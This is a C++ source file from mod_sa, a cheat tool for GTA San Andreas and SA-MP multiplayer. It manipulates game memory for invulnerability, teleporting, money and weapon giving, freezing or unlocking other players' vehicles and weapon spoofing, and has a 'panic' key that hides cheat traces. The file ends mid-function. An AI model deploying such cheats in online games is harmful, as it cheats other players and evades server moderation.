/*

	PROJECT:		mod_sa
	LICENSE:		See LICENSE in the top level directory
	COPYRIGHT:		Copyright we_sux 

	mod_sa is available from http://code.google.com/p/m0d-s0beit-sa/

	mod_sa is free software: you can redistribute it and/or modify 
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	mod_sa is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with mod_sa.  If not, see <http://www.gnu.org/licenses/>.

*/


#include "main.h"


int iClickWarpEnabled = 0;


int random(int min, int max)
{
   return (rand() % (max - min+1) + min);
}
 float random_float(float a, float b)
{
    float random = ((float) rand()) / (float) RAND_MAX;
    float diff = b - a;
    float r = random * diff;
    return a + r;
}


int cheat_panic ( void )
{
	traceLastFunc( "cheat_panic()" );

	static int	pstate_map = 0, // m0d's map
		pstate_d3dtext_hud = 0, // hud bar
		pstate_actor_hp_nSP = 0, // "Extra actor invincibility" patch (invulnerable single player enemies)
		pstate_actor_hp_SP = 0, // "Extra actor invincibility2" patch (no problems in SP)
		pstate_vehicle_hp = 0, // vehicle hp patch
		pstate_generic_menu = 0, // m0d's menu
		pstate_infnos = 0, // infinite NOS
		pstate_ini[INI_PATCHES_MAX],
		pstate_dummy_aligner; // this should all be a structure, static = DOING IT WRONG
	int			i;

	// sa-mp related
	static int	pstate_chat = 0, // chat
		pstate_deathlist = 0; // deathlist

	if ( KEY_PRESSED(set.key_panic) )
	{
		// toggle panic
		cheat_state->_generic.cheat_panic_enabled ^= 1;

		if ( cheat_state->_generic.cheat_panic_enabled )
		{
			struct actor_info	*actor_info = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );

			if ( actor_info )
			{
				actor_info->flags &= ~ACTOR_FLAGS_INVULNERABLE;
				actor_info->weapon_slot = 0;
			}

			// remove infinite NOS
			pstate_infnos = cheat_state->vehicle.infNOS_toggle_on;
			cheat_state->vehicle.infNOS_toggle_on = false;
			patcher_remove( &patch_vehicle_inf_NOS );

			if ( pPedSelf->GetVehicle() )
			{
				CVehicle	*pVehicleSelf = pPedSelf->GetVehicle();
				CVehicle	*pVehicleTemp = NULL;

				for ( pVehicleTemp = pVehicleSelf; pVehicleTemp != NULL; pVehicleTemp = pVehicleTemp->GetTowedVehicle() )
				{
					pVehicleTemp->SetGravity( &CVector(0.0, 0.0, -1.0) );
					pVehicleTemp->SetCanBeDamaged( true );

					if ( !set.trailer_support )
						break;
				}

				// remove inf NOS
				if ( pstate_infnos )
				{
					pVehicleSelf->RemoveVehicleUpgrade( 1010 );
					//pVehicleSelf->AddVehicleUpgrade( 1010 );
				}

				// reset overrideLights, pstate not needed, will be reactivated on demand
				if ( set.enable_car_lights_at_day_time )
					pVehicleSelf->SetOverrideLights( 0 );
			}

			// hud bar, this should probably become a cheat_state
			pstate_d3dtext_hud = set.d3dtext_hud;
			set.d3dtext_hud = 0;

			// m0d's map
			pstate_map = cheat_state->_generic.map;
			cheat_state->_generic.map = 0;

			// m0d's menu
			pstate_generic_menu = cheat_state->_generic.menu;
			cheat_state->_generic.menu = 0;

			// remove "Extra actor invincibility" patch
			pstate_actor_hp_nSP = patch_actor_hp_extraInv.installed;
			patcher_remove( &patch_actor_hp_extraInv );
			pstate_actor_hp_SP = patch_actor_hp.installed;
			patcher_remove( &patch_actor_hp );

			// remove vehicle hp patch
			pstate_vehicle_hp = patch_vehicle_hp.installed;
			patcher_remove( &patch_vehicle_hp );

			// just call with null vehicle info to disable
			cheat_handle_vehicle_fly( NULL, 0.0f );

			for ( i = 0; i < INI_PATCHES_MAX; i++ )
			{
				// added to not remove volatile patches
				if ( !set.patch[i].has_volatile )
				{
					pstate_ini[i] = set.patch[i].installed;
					patcher_remove( &set.patch[i] );
				}
			}

			// turn off kill & chat
			if ( g_DeathList != NULL )
			{
				pstate_deathlist = g_DeathList->iEnabled;
				g_DeathList->iEnabled = 1;
			}
			if ( g_Chat != NULL )
			{
				pstate_chat = g_Chat->iChatWindowMode;
				g_Chat->iChatWindowMode = 2;
			}
		}
		else
		{
			// restore infinite NOS
			if ( pstate_infnos )
			{
				cheat_state->vehicle.infNOS_toggle_on = true;
				patcher_install( &patch_vehicle_inf_NOS );
			}

			// vehicle stuff
			CPed	*pPedSelf = pPools->GetPedFromRef( CPOOLS_PED_SELF_REF );
			if ( pPedSelf->GetVehicle() )
			{
				CVehicle	*pVehicleSelf = pPedSelf->GetVehicle();
				// restore inf NOS
				if ( pstate_infnos )
				{
					pVehicleSelf->AddVehicleUpgrade( 1010 );
				}
			}


			// restore "Extra actor invincibility" patch
			if ( pstate_actor_hp_nSP )
				patcher_install( &patch_actor_hp_extraInv );
			if ( pstate_actor_hp_SP )
				patcher_install( &patch_actor_hp );

			// restore vehicle hp patch
			if ( pstate_vehicle_hp )
				patcher_install( &patch_vehicle_hp );

			// restore some cheat_states
			set.d3dtext_hud = pstate_d3dtext_hud;
			cheat_state->_generic.map = pstate_map;
			cheat_state->_generic.menu = pstate_generic_menu;

			// restore patches
			for ( i = 0; i < INI_PATCHES_MAX; i++ )
			{
				if ( pstate_ini[i] )
					patcher_install( &set.patch[i] );
			}

			// restore kill & chat
			if ( g_DeathList != NULL )
			{
				g_DeathList->iEnabled = pstate_deathlist;
			}
			if ( g_Chat != NULL )
			{
				g_Chat->iChatWindowMode = pstate_chat;
			}

			// clear cheat state text
			cheat_state_text( NULL );
		}
	}

	return cheat_state->_generic.cheat_panic_enabled;
}

/* XXX move to cheat_funcs.cpp? */
extern bool GTAfunc_RemoveActorFromCarAndPutAt_requestingTeleport;
void cheat_teleport ( const float pos[3], int interior_id )
{
	if ( cheat_state->state == CHEAT_STATE_ACTOR
		|| GTAfunc_RemoveActorFromCarAndPutAt_requestingTeleport )
	{
		GTAfunc_RemoveActorFromCarAndPutAt_requestingTeleport = false;
		cheat_actor_teleport( actor_info_get(ACTOR_SELF, 0), pos, interior_id );
	}
	else if ( cheat_state->state == CHEAT_STATE_VEHICLE ) //&& !set.teleport_slow )
		cheat_vehicle_teleport( vehicle_info_get(VEHICLE_SELF, 0), pos, interior_id );
	/*else if ( cheat_state->state == CHEAT_STATE_VEHICLE && set.teleport_slow )
	{
		vect3_copy(pos, cheat_state->vehicle.tele_coords);
		cheat_state->vehicle.tele_on = 1;
	}*/
}

void cheat_teleport_nearest_car ( void )
{
	int					id = vehicle_find_nearest( VEHICLE_ALIVE | VEHICLE_EMPTY );
	struct vehicle_info *info = vehicle_info_get( id, VEHICLE_ALIVE | VEHICLE_EMPTY );

	if ( id == -1 || info == NULL )
		return;

	cheat_teleport( &info->base.matrix[4 * 3], info->base.interior_id );
}

void cheat_handle_misc ( void )
{
	if ( set.clickwarp_enabled )
	{
		if(KEY_PRESSED(set.key_clickwarp_enable))
		{
			g_iCursorEnabled ^= 1;
			toggleSAMPCursor(g_iCursorEnabled);
		}
		if(g_iCursorEnabled && KEY_PRESSED(set.key_clickwarp_click))
		{
			iClickWarpEnabled = 1;
		}
	}

	if ( KEY_PRESSED(set.key_map) )
	{
		cheat_state->_generic.map ^= 1; /* toggle minimap */
	}

	if ( KEY_PRESSED(set.key_map_show_vehicles) )
	{
		cheat_state->_generic.map_vehicles ^= 1;
	}

	if ( KEY_DOWN(set.secondary_key) )
	{
		if ( KEY_PRESSED(set.key_render_player_tags) )
			cheat_state->render_player_tags ^= 1;
		if ( KEY_PRESSED(set.key_render_vehicle_tags) )
			cheat_state->render_vehicle_tags ^= 1;
	}

	/* time */
	if ( set.force_hour >= 0 )
		gta_time_hour_set( set.force_hour );

	/* weather */
	if ( set.force_weather >= 0 )
		gta_weather_state_set( set.force_weather );

	SetCloudsEnabled( set.enable_clouds );
}

void cheat_handle_debug ( HWND wnd )
{
	static const int	data_size[4] = { 1, 2, 4, 4 };
	struct debug_info	*debug = &cheat_state->debug;
	int					move = 0, hist_chng = 0;

	if ( !cheat_state->debug_enabled )
		return;

	/* go to pointer */
	if ( KEY_PRESSED(VK_NUMPAD1) )
	{
		setDebugPointer( *(void **)debug->cursor_data );
		hist_chng = 1;
	}

	/* go back */
	if ( KEY_PRESSED(VK_NUMPAD7) )
	{
		if ( debug->hist_pos > 0 )
		{
			debug->hist_pos--;
			hist_chng = 1;
		}
		else if ( debug->hist_pos == 0 )
			setDebugPointer( (void *)NULL );
	}

	/* change data type */
	if ( KEY_PRESSED(VK_DIVIDE) )
		debug->data_type = ( debug->data_type + 1 ) % 4;

	/* inc/dec value */
	if ( KEY_DOWN(VK_ADD) || KEY_DOWN(VK_SUBTRACT) )
	{
		const int	value = KEY_DOWN( VK_ADD ) ? 1 : -1;
		uint8_t		data[4] = { 0, 0, 0, 0 };

		if ( memcpy_safe(data, debug->ptr[debug->hist_pos] + debug->offset[debug->hist_pos], data_size[debug->data_type]) )
		{
			switch ( debug->data_type )
			{
#pragma warning( disable : 4244 )

			case 0:
				( *(uint8_t *)data ) += ( uint8_t ) value;
				break;

			case 1:
				( *(uint16_t *)data ) += ( uint16_t ) value;
				break;

			case 2:
				( *(uint32_t *)data ) += ( uint32_t ) value;
				break;

			case 3:
				( *(float *)data ) += (float)value / 10.0f;
				break;
			}

			memcpy_safe( debug->ptr[debug->hist_pos] + debug->offset[debug->hist_pos], data, data_size[debug->data_type] );
		}
	}

	/* copy info to clipboard */
	if ( KEY_PRESSED(VK_MULTIPLY) )
	{
		if ( OpenClipboard(wnd) )
		{
			HGLOBAL mem = GlobalAlloc( GMEM_MOVEABLE, sizeof(debug->ptr_hist_str) );

			if ( mem != NULL )
			{
				char	*str = (char *)GlobalLock( mem );

				strlcpy( str, debug->ptr_hist_str, sizeof(debug->ptr_hist_str) );
				Log( "%s", str );
				GlobalUnlock( str );

				EmptyClipboard();

				if ( !SetClipboardData(CF_TEXT, mem) )
					Log( "SetClipboardData() %d", GetLastError() );

				/*SetClipboardData(CF_TEXT, mem);*/
			}

			CloseClipboard();
		}
		else
		{
			Log( "OpenClipboard() %d", GetLastError() );
		}
	}

	if ( KEY_PRESSED(VK_NUMPAD4) )
		move -= data_size[debug->data_type];
	if ( KEY_PRESSED(VK_NUMPAD6) )
		move += data_size[debug->data_type];
	if ( KEY_PRESSED(VK_NUMPAD8) )
		move += -16;
	if ( KEY_PRESSED(VK_NUMPAD2) )
		move += 16;
	if ( KEY_PRESSED(VK_NUMPAD9) )
		move += -160;
	if ( KEY_PRESSED(VK_NUMPAD3) )
		move += 160;

	debug->offset[debug->hist_pos] += move;

	if ( move != 0 || hist_chng )
	{
		memset( debug->modify_time, 0, DEBUG_DATA_SIZE * sizeof(uint32_t) );
		debug->data_prev_clear = 1;
	}

	for ( int i = 0; i < 9; i++ )
		KEY_CONSUME( VK_NUMPAD1 + i );
	KEY_CONSUME( VK_MULTIPLY );
	KEY_CONSUME( VK_DIVIDE );
	KEY_CONSUME( VK_ADD );
	KEY_CONSUME( VK_SUBTRACT );
}

void cheat_handle_spoof_weapon ( void )
{
	struct actor_info	*info = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );

	/*struct samp_info *spl = samp_info_get();*/
	if ( info != NULL )
	{
		if ( cheat_state->_generic.spoof_weapon != -1 )
			info->weapon_hit_type = ( uint8_t ) cheat_state->_generic.spoof_weapon;
	}
}

void cheat_handle_weapon_disable ( void )
{
	struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );
	struct actor_info	*info;
	int					bad_weapon_ids[] =
	{
		16, /* Grenade */
		17, /* Teargas */
		18, /* Molotov Cocktail */
		35, /* Rocket Launcher */
		36, /* Heat Seeking RPG */
		39, /* Remote Explosives */
		40, /* Detonator */
		-1
	};
	int					i, j;

	if ( !cheat_state->_generic.weapon_disable )
		return;

	for ( i = 0; i < pool_actor->size; i++ )
	{
		if ( (info = actor_info_get(i, ACTOR_ALIVE)) == NULL )
			continue;

		if ( info == self )
			continue;

		if ( info->weapon_slot > 12 )
			continue;

		if ( (int)info->weapon[info->weapon_slot].id > 46 ) /* invalid weapon ID */
			goto bad_weapon;

		/* filter disallowed weapons */
		for ( j = 0; bad_weapon_ids[j] != -1; j++ )
		{
			if ( (int)info->weapon[info->weapon_slot].id == bad_weapon_ids[j] )
				goto bad_weapon;
		}

		continue;
bad_weapon: ;
		info->weapon_slot = 0;
	}
}

struct freeze_info
{
	int		set;
	float	matrix[16];
};

void cheat_handle_freeze_vehicles ( struct vehicle_info *vehicle_info, struct actor_info *actor_info )
{
	traceLastFunc( "cheat_handle_freeze_vehicles()" );

	static struct freeze_info	*freeze;
	struct vehicle_info			*info;
	float						*pos;
	int							i;

	if ( KEY_PRESSED(set.key_vehicles_freeze) )
	{
		cheat_state->_generic.vehicles_freeze ^= 1;
		if ( !cheat_state->_generic.vehicles_freeze && freeze != NULL )
			memset( freeze, 0, pool_vehicle->size * sizeof(struct freeze_info) );
	}

	if ( vehicle_info != NULL )
		pos = &vehicle_info->base.matrix[4 * 3];
	else if ( actor_info != NULL )
		pos = &actor_info->base.matrix[4 * 3];
	else
		return;

	if ( freeze == NULL )	/* XXX free on exit */
	{
		freeze = (struct freeze_info *)malloc( pool_vehicle->size * sizeof(struct freeze_info) );
		if ( freeze == NULL )
			return;
		memset( freeze, 0, pool_vehicle->size * sizeof(struct freeze_info) );
	}

	if ( cheat_state->_generic.vehicles_freeze )
	{
		for ( i = 0; i < pool_vehicle->size; i++ )
		{
			if ( (info = vehicle_info_get(i, VEHICLE_ALIVE)) == NULL || info == vehicle_info )
			{
				if ( info == vehicle_info && freeze[i].set )
					cheat_vehicle_air_brake_set( 1 );	/* entered a frozen vehicle */
				freeze[i].set = 0;
				continue;
			}

			if ( freeze[i].set )
			{
				matrix_copy( freeze[i].matrix, info->base.matrix );
				vect3_mult( info->speed, 0.0f, info->speed );
				vect3_mult( info->spin, 0.0f, info->spin );
			}

			if ( vehicle_contains_trailer(vehicle_info, info) )
			{
				freeze[i].set = 0;
				continue;
			}

			if ( vect3_dist(pos, &info->base.matrix[4 * 3]) >= 80.0f )
			{
				freeze[i].set = 0;
				continue;
			}

			if ( freeze[i].set )
			{
				continue;
			}

			matrix_copy( info->base.matrix, freeze[i].matrix );
			freeze[i].set = 1;
		}
	}
}

void cheat_handle_unlock ( void )
{
	struct vehicle_info *info;
	int					i;

	if ( cheat_state->_generic.vehicles_unlock )
	{
		for ( i = 0; i < pool_vehicle->size; i++ )
		{
			info = vehicle_info_get( i, 0 );
			if ( info != NULL )
				info->door_status = 1;			/* unlocked */
		}
	}
}

void cheat_handle_hp ( struct vehicle_info *vehicle_info, struct actor_info *actor_info, float time_diff )
{
	traceLastFunc( "cheat_handle_hp()" );

	static float	prev_pos[3];

	if ( KEY_PRESSED(set.key_hp_cheat) )
		cheat_state->_generic.hp_cheat ^= 1;	/* toggle hp cheat */

	// this will make SP enemies invulnerable
	// now checking for a valid SAMP game
	if (g_SAMP)
	{
		if ( cheat_state->_generic.hp_cheat && cheat_state->actor.invulnerable && !set.hp_disable_inv_sp_enemies )
			patcher_install( &patch_actor_hp_extraInv );
		else
			patcher_remove( &patch_actor_hp_extraInv );
	}
	
	if ( cheat_state->_generic.hp_cheat && cheat_state->actor.invulnerable )
		patcher_install( &patch_actor_hp );
	else
		patcher_remove( &patch_actor_hp );

	if ( cheat_state->_generic.hp_cheat && cheat_state->vehicle.invulnerable )
		patcher_install( &patch_vehicle_hp );
	else
		patcher_remove( &patch_vehicle_hp );

	if ( vehicle_info != NULL )
	{
		struct vehicle_info *info = vehicle_info;
		struct vehicle_info *temp;

		// actor_info is NULL, if vehicle_info is not ( we need the actor though )
		actor_info = actor_info_get( ACTOR_SELF, 0 );

		if ( cheat_state->_generic.hp_cheat )
		{

			for ( temp = info; temp != NULL; temp = temp->trailer )
			{
				if(temp == NULL) return;

				/* minimum hp */
				if ( cheat_state->vehicle.hp_minimum_on && temp->hitpoints < set.hp_minimum )
					temp->hitpoints = set.hp_minimum;

				if ( set.hp_keep_vehicleHPsane )
				{
					// actor_info was NULL duh
					if ( temp->passengers[0] == actor_info && temp->hitpoints > 1000.0f )
					{
						if ( set.hp_minimum <= 1000.0f )
							temp->hitpoints = 1000.0f;
						else if ( temp->hitpoints > set.hp_minimum )
							temp->hitpoints = set.hp_minimum;
					}
				}

				/* regen */
				if ( temp->hitpoints < 1000.0f )
					temp->hitpoints += time_diff * set.hp_regen;

				if ( cheat_state->vehicle.invulnerable )
				{
					temp->m_nVehicleFlags.bCanBeDamaged = false;
					//temp->flags |= VEHICLE_FLAGS_INVULNERABLE;	/* invulnerable to most things */
					temp->flags &= ~2; /* make sure we're not frozen :p */
					//if ( temp->pulling_truck != NULL )
					//	temp->hitpoints = 1000.0f;
				}
				else
				{
					temp->m_nVehicleFlags.bCanBeDamaged = true;
					//temp->flags &= ~VEHICLE_FLAGS_INVULNERABLE;
				}

				if ( cheat_state->vehicle.hp_tire_support )
					cheat_vehicle_tires_set( temp, 0 );

				/*
				if(cheat_state->vehicle.is_engine_on == 1)
					temp->m_nVehicleFlags.bEngineOn = 1;
				else if((cheat_state->vehicle.is_engine_on == 0))
					temp->m_nVehicleFlags.bEngineOn = 0;
				*/
				// temp->engine_state |= 16; // protect against engine stalls
				if ( !set.trailer_support )
					break;
			}
		}
		else
		{
			for ( temp = info; temp != NULL; temp = temp->trailer )
			{
				if(temp == NULL) return;

				// HP cheat disabled - keep HP value sane
				if ( set.hp_keep_vehicleHPsane )
				{
					if ( temp->hitpoints > 1000.0f )
						temp->hitpoints = 1000.0f;
				}

				temp->m_nVehicleFlags.bCanBeDamaged = true;
				//temp->flags &= ~VEHICLE_FLAGS_INVULNERABLE;

				if ( !set.trailer_support )
					break;
			}
		}
	}

	if ( actor_info != NULL )
	{
		struct actor_info	*info = actor_info;

		if ( cheat_state->_generic.hp_cheat )
		{
			if ( info->hitpoints < 100.0f )
				info->hitpoints += time_diff * set.hp_regen_onfoot;
		}

		if ( cheat_state->_generic.hp_cheat && cheat_state->actor.invulnerable )
		{
			// invulnerability is on - at least be
			//  invulnerable against non explosive projectiles
			info->flags |= 4;
			if ( set.hp_actor_explosion_inv )
				info->flags |= 8;
			if ( set.hp_actor_fall_inv )
				info->flags |= 64;
			if ( set.hp_actor_fire_inv )
				info->flags |= 128;
			//info->flags |= ACTOR_FLAGS_INVULNERABLE;
		}
		else
			info->flags &= ~ACTOR_FLAGS_INVULNERABLE;
	}
}

void cheat_handle_stick ( struct vehicle_info *vehicle_info, struct actor_info *actor_info, float time_diff )
{
	traceLastFunc( "cheat_handle_stick()" );

	struct object_base	*base_stick, *base_self;
	struct actor_info	*actor_stick;
	struct vehicle_info *vehicle_stick;
	float				*speed_stick, *speed_self;
	float				*spin_stick, *spin_self;
	static int			id = -1;
	int					i;

	if ( KEY_PRESSED(set.key_stick) )
	{
		if ( vehicle_info != NULL )
			cheat_state->vehicle.stick ^= 1;
		else
			cheat_state->actor.stick ^= 1;
		id = actor_find( id - 1, 1, ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );
	}

	if ( KEY_PRESSED(set.key_stick_nearest) )
	{
		if ( vehicle_info != NULL )
			cheat_state->vehicle.stick ^= 1;
		else
			cheat_state->actor.stick ^= 1;
		id = actor_find_nearest( ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );
	}

	if ( (vehicle_info != NULL && cheat_state->vehicle.stick) || (actor_info != NULL && cheat_state->actor.stick) )
	{
		// remove any bad vehicle or actor stuffs
		if ( isBadPtr_GTA_pVehicle(vehicle_info) )
			vehicle_info = NULL;
		if ( isBadPtr_GTA_pPed(actor_info) )
			actor_info = NULL;

		/* check if actor has disappeared.. and if it has, switch to teh nearest */
		if ( id != -1 && actor_info_get(id, ACTOR_ALIVE) == NULL )
			id = actor_find_nearest( ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );

		if ( KEY_PRESSED(set.key_stick_prev) )
			id = actor_find( id, -1, ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );

		if ( KEY_PRESSED(set.key_stick_next) )
			id = actor_find( id, 1, ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );

		/* no actors to stick to */
		if ( id == -1 )
		{
			cheat_state_text( "No players found; stick disabled." );
			cheat_state->vehicle.stick = 0;
			cheat_state->actor.stick = 0;
			return;
		}

		/* get actor struct for the actor we're sticking to */
		actor_stick = actor_info_get( id, ACTOR_ALIVE | ACTOR_NOT_SAME_VEHICLE );
		if ( actor_stick == NULL )
			return;

		/* is this actor in a vehicle? */
		vehicle_stick = actor_vehicle_get( actor_stick );

		base_stick = vehicle_stick ? &vehicle_stick->base : &actor_stick->base;
		base_self = vehicle_info ? &vehicle_info->base : &actor_info->base;

		speed_stick = vehicle_stick ? vehicle_stick->speed : actor_stick->speed;
		speed_self = vehicle_info ? vehicle_info->speed : actor_info->speed;

		spin_stick = vehicle_stick ? vehicle_stick->spin : actor_stick->spin;
		spin_self = vehicle_info ? vehicle_info->spin : actor_info->spin;

		/* allow warping to work + always warp towards whatever we're sticking to...
         but only when we're in a vehicle */
		if ( KEY_PRESSED(set.key_warp_mod) && vehicle_info != NULL )
		{
			float	out[4];

			/* multiply the matrix of whatever we're sticking to with the user supplied vector */
			matrix_vect4_mult( base_stick->matrix, set.stick_vect, out );

			/* multiply the result with the negative warp-speed value, and put it in the speed vector
            (negative because we want to warp towards teh target, not away from it */
			vect3_mult( out, -set.warp_speed, speed_self );
		}

		if ( !KEY_DOWN(set.key_warp_mod) )
		{
			float	d[4] = { 0.0f, 0.0f, 0.0f, 0.0f };
			float	accel_mult = 1.0f;
			float	out[4];

			/* handle stick movement keys */
			if ( KEY_DOWN(set.key_stick_forward) )
				d[1] += 1.0f;
			if ( KEY_DOWN(set.key_stick_backward) )
				d[1] -= 1.0f;
			if ( KEY_DOWN(set.key_stick_left) )
				d[0] -= 1.0f;
			if ( KEY_DOWN(set.key_stick_right) )
				d[0] += 1.0f;
			if ( KEY_DOWN(set.key_stick_up) )
				d[2] += 1.0f;
			if ( KEY_DOWN(set.key_stick_down) )
				d[2] -= 1.0f;
			if ( KEY_DOWN(set.key_stick_in) )
				d[3] -= 1.0f;
			if ( KEY_DOWN(set.key_stick_out) )
				d[3] += 1.0f;

			if ( !near_zero(set.stick_accel_time) )
			{
				static uint32_t time_start;

				if ( !vect4_near_zero(d) )
					time_start = ( time_start == 0 ) ? time_get() : time_start;
				else
					time_start = 0;			/* no keys pressed */

				/* acceleration */
				if ( time_start != 0 )
				{
					float	t = TIME_TO_FLOAT( time_get() - time_start );
					if ( t < set.stick_accel_time )
						accel_mult *= t / set.stick_accel_time;
				}
			}

			/* calculate new vector + dist */
			if ( !vect3_near_zero(d) && !vect3_near_zero(set.stick_vect) )
			{
				for ( i = 0; i < 3; i++ )
				{
					d[i] = set.stick_vect[i] * set.stick_vect_dist + d[i] * time_diff * 8.0f * accel_mult;
				}

				set.stick_vect_dist = vect3_length( d );
				vect3_normalize( d, set.stick_vect );
			}

			/* move towards/away from the center */
			if ( !near_zero(d[3]) )
				set.stick_vect_dist += d[3] * time_diff * 40.0f * accel_mult;

			/* Teleport vehicle detachables */
			if ( vehicle_info != NULL )
				vehicle_detachables_teleport( vehicle_info, &base_self->matrix[4 * 3], &base_stick->matrix[4 * 3] );

			matrix_copy( base_stick->matrix, base_self->matrix );
			vect3_copy( speed_stick, speed_self );
			vect3_copy( spin_stick, spin_self );

			/*base_self->interior_id = base_stick->interior_id;
         gta_interior_id_set(base_stick->interior_id);*/
			/* multiply the matrix of the target with the user supplied vector */
			matrix_vect4_mult( base_stick->matrix, set.stick_vect, out );

			/* multiply the result with the user supplied vector distance */
			vect3_mult( out, set.stick_vect_dist, out );

			/* and add it to our position */
			vect3_vect3_add( &base_self->matrix[4 * 3], out, &base_self->matrix[4 * 3] );

			if ( vehicle_info != NULL )
			{
				/* Teleport detachables again :p */
				vehicle_detachables_teleport( vehicle_info, &base_stick->matrix[4 * 3], &base_self->matrix[4 * 3] );
				vehicle_prevent_below_height( vehicle_info, set.stick_min_height );
			}
			else if ( actor_info != NULL )
			{
				// new pedFlags
				actor_info->pedFlags.bIsStanding = true;
				actor_info->pedFlags.bWasStanding = true;
				actor_info->pedFlags.bStayInSamePlace = true;
			}
		}
	}
}

static int __money_interval_rand_time ( void )
{
	const int	min = set.money_interval_rand_min;
	const int	max = set.money_interval_rand_max + 1;

	return MSEC_TO_TIME( (min + (rand() % (max - min))) * 1000 );
}

void cheat_handle_money ( void )
{
	static uint32_t next_time;

	if ( !cheat_state->_generic.money )
		next_time = time_get();

	if ( KEY_PRESSED(set.key_money) )
		cheat_state->_generic.money ^= 1;

	if ( cheat_state->_generic.money && time_get() >= next_time )
	{
		const int	min = set.money_amount_rand_min;
		const int	max = set.money_amount_rand_max;
		uint32_t	money = gta_money_get();
		int			add;

		if ( money < (uint32_t) set.money_amount_max )
		{
			add = ( (max - min) > 0 ) ? ( rand() % (max - min) ) : 0;
			add = ( (add + 50) / 100 ) * 100;
			money += min + add;
			gta_money_set( money );
		}

		next_time = time_get() + __money_interval_rand_time();
	}
}

void cheat_handle_weapon ( void )
{
	struct actor_info	*actor_info = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );
	int					i;

	if ( KEY_PRESSED(set.key_weapon) )
		cheat_state->_generic.weapon ^= 1;	/* toggle weapon cheat */

	if ( cheat_state->_generic.weapon )
	{
		if ( actor_info != NULL )
		{
			for ( i = 0; i < 13; i++ )
			{
				if ( set.weapon[i] == NULL )
					continue;

				if ( set.ammo_random )
				{
					if ( actor_info->weapon[set.weapon[i]->slot].id != set.weapon[i]->id
					 ||	 (
							 actor_info->weapon[set.weapon[i]->slot].ammo == 0
					 &&	 actor_info->weapon[set.weapon[i]->slot].ammo_clip == 0
					 ) )
					{
						int randammo = ( rand() % set.ammo ) + 1;
						int randammoclip = ( rand() % set.ammo_clip ) + 1;
						gta_weapon_set( actor_info, set.weapon[i]->slot, set.weapon[i]->id, randammo, randammoclip );
					}
				}
				else
				{
					gta_weapon_set( actor_info, set.weapon[i]->slot, set.weapon[i]->id, set.ammo, set.ammo_clip );
				}
			}
		}
		else if ( !set.restore_weapons_after_death )
		{
			cheat_state->_generic.weapon = 0;
		}
	}
}

void cheat_handle_teleport ( struct vehicle_info *vehicle_info, struct actor_info *actor_info, float time_diff )
{
	traceLastFunc( "cheat_handle_teleport()" );

	struct object_base	*base = ( vehicle_info != NULL ) ? &vehicle_info->base : &actor_info->base;
	int					i;

	// Set teleport coordinates
	for ( i = 0; i < TELEPORT_MAX; i++ )
	{
		if ( set.key_teleport_set[i] == 0 )
			continue;
		if ( KEY_PRESSED(set.key_teleport_set[i]) )
		{
			cheat_state->teleport[i].set = 1;
			matrix_copy( base->matrix, cheat_state->teleport[i].matrix );
			cheat_state->teleport[i].interior_id = gta_interior_id_get();
			cheat_state_text( "Teleport coordinates set." );
		}
	}

	// Teleport to stored coordinates
	for ( i = 0; i < TELEPORT_MAX; i++ )
	{
		if ( set.key_teleport[i] == 0 )
			continue;
		if ( KEY_PRESSED(set.key_teleport[i]) )
		{
			if ( cheat_state->teleport[i].set )
			{
				cheat_teleport_history_save();
				cheat_teleport( &cheat_state->teleport[i].matrix[4 * 3], cheat_state->teleport[i].interior_id );

				// when teleports are stored in-game, we have a copy of the matrix to preserve rotation, etc..
				matrix_copy( cheat_state->teleport[i].matrix, base->matrix );
			}
			else if ( !vect3_near_zero(set.teleport[i].pos) )
			{
				cheat_teleport_history_save();
				cheat_teleport( set.teleport[i].pos, set.teleport[i].interior_id );
			}
			else
			{
				cheat_state_text( "Teleport coordinates not set." );
				break;
			}
			break;
		}
	}

	if ( KEY_PRESSED(set.key_teleport_hist) )
	{
		struct cheat_state_teleport *teleport = NULL;

		cheat_state->teleport_hist_count--;
		if ( cheat_state->teleport_hist_count < 0 )
			cheat_state->teleport_hist_count = 0;
		else
			teleport = &cheat_state->teleport_hist[cheat_state->teleport_hist_count];

		if ( teleport != NULL && teleport->set )
		{
			cheat_teleport( &teleport->matrix[4 * 3], teleport->interior_id );
			matrix_copy( teleport->matrix, base->matrix );
			teleport->set = 0;
		}
		else
		{
			cheat_state_text( "Teleport history list is empty." );
		}
	}
}

void cheat_handle_checkpoint ( void )
{
	if ( KEY_PRESSED(set.key_checkpoint_1) || KEY_PRESSED(set.key_checkpoint_2) )
	{
		int					n = KEY_PRESSED( set.key_checkpoint_1 ) ? 0 : 1;
		struct checkpoint	*cp = gta_checkpoint_info_get( n );
		float				pos[3];

		if ( cp != NULL )
		{
			struct vehicle_info *vehicle_info = vehicle_info_get( VEHICLE_SELF, 0 );

			vect3_copy( cp->position, pos );
			pos[2] += 1.0f;
			cheat_teleport( pos, 0 );		/* XXX interior id? */

			if ( vehicle_info != NULL )
				vehicle_prevent_below_height( vehicle_info, set.checkpoint_min_height );
		}
		else
		{
			cheat_state_text( "Checkpoint does not exist." );
		}
	}
}

void cheat_handle_unfreeze ( struct vehicle_info *vehicle_info, struct actor_info *actor_info, float time_diff )
{
	traceLastFunc( "cheat_handle_unfreeze()" );

	if ( KEY_PRESSED(set.key_anti_freeze) )
	{
		GTAfunc_TogglePlayerControllable(0);
		GTAfunc_LockActor(0);
		pGameInterface->GetCamera()->RestoreWithJumpCut();
		
		// stop all animations
		if ( actor_info != NULL && !actor_info->pedFlags.bInVehicle )
			GTAfunc_DisembarkInstantly();
	}
}

void cheat_handle_emo ( struct vehicle_info *vehicle_info, struct actor_info *actor_info, float time_diff )
{
	traceLastFunc( "cheat_handle_emo()" );

	struct vehicle_info *vtemp;

	if ( !isBadPtr_GTA_pPed(actor_info) )
	{
		if ( KEY_PRESSED(set.key_self_destruct) )
